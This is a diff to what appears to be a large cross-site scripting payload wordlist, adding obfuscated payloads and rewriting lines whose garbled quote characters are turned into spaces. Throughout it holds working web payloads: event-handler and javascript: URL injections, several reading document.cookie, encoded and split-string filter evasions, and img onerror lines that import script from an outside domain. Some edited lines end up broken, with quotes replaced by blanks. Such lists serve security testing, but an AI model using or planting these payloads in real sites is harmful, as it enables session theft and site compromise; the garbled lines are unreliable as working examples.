@@ -1,5 +1,12 @@
 '"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](document%2Bcookie)>
 "><img/src/onerror=import('//domain/')>"@yourdomain
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+/(A(%22onerror='alert%60123%60'test))/
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *>
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&#x0000000000061;lert&#x000000028;origin&#x000029;>
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+"ontouchend%3Dprompt%281%29+class%3Dd3rk+
+"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
 013371337;ext=<img/src/onerror=import('//domain/')>
 "><img/src/onerror=import('//domain/')>"
 <Svg Only=1 OnLoad=confirm(document.domain)>
@@ -27760,23 +27767,23 @@ http://www.<script>alert(1)</script .com
 <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
-�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�;alert(String.fromCharCode(88,83,83))//�></SCRIPT>�>�><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-<IMG ���><SCRIPT>alert(�XSS�)</SCRIPT>�>
+ ;alert(String.fromCharCode(88,83,83))// ;alert(String.fromCharCode(88,83,83))// ;alert(String.fromCharCode(88,83,83))// ;alert(String.fromCharCode(88,83,83))// ></SCRIPT> > ><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<IMG    ><SCRIPT>alert( XSS )</SCRIPT> >
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-<IMG SRC=�jav ascript:alert(�XSS�);�>
-<IMG SRC=�jav&#x09;ascript:alert(�XSS�);�>
-<<SCRIPT>alert(�XSS�);//<</SCRIPT>
+<IMG SRC= jav ascript:alert( XSS ); >
+<IMG SRC= jav&#x09;ascript:alert( XSS ); >
+<<SCRIPT>alert( XSS );//<</SCRIPT>
 %253cscript%253ealert(1)%253c/script%253e
-�><s�%2b�cript>alert(document.cookie)</script>
+ ><s %2b cript>alert(document.cookie)</script>
 foo<script>alert(1)</script>
 <scr<script>ipt>alert(1)</scr</script>ipt>
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-<BODY BACKGROUND=�javascript:alert(�XSS�)�>
-<BODY ONLOAD=alert(�XSS�)>
-<INPUT TYPE=�IMAGE� SRC=�javascript:alert(�XSS�);�>
-<IMG SRC=�javascript:alert(�XSS�)�
+<BODY BACKGROUND= javascript:alert( XSS ) >
+<BODY ONLOAD=alert( XSS )>
+<INPUT TYPE= IMAGE  SRC= javascript:alert( XSS ); >
+<IMG SRC= javascript:alert( XSS ) 
 <iframe src=http://ha.ckers.org/scriptlet.html <
 javascript:alert("hellox worldss")
 <img src="javascript:alert('XSS');">
@@ -27836,7 +27843,7 @@ LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green
 &lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
 &lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
 &lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
-�scriptualert(EXSSE)�/scriptu
+ scriptualert(EXSSE) /scriptu
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
@@ -28017,7 +28024,7 @@ perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
 <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
 \";alert('XSS');//
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
-�script�alert(�XSS�)�/script�
+ script alert( XSS ) /script 
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
